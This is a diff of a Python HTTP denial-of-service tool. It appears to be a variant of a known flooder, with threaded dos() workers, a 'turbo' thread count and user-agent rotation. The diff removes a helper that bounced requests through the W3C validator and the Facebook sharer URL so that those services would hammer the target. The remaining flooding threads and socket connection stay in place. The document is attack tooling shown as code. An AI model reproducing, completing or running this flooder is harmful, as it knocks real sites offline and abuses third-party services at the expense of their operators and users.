@@ -23,14 +23,6 @@ def user_agent():
 	return(uagent)
 
 
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
-
-
 def bot_hammering(url):
 	try:
 		while True:
@@ -65,13 +57,6 @@ def dos():
 		item = q.get()
 		down_it(item)
 		q.task_done()
-
-
-def dos2():
-	while True:
-		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
-		w.task_done()
 
 
 def usage():
@@ -131,8 +116,8 @@ if __name__ == '__main__':
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
+    
 	user_agent()
-	my_bots()
 	time.sleep(5)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -146,9 +131,6 @@ if __name__ == '__main__':
 			t = threading.Thread(target=dos)
 			t.daemon = True  # if thread is exist, it dies
 			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
 		start = time.time()
 		#tasking
 		item = 0
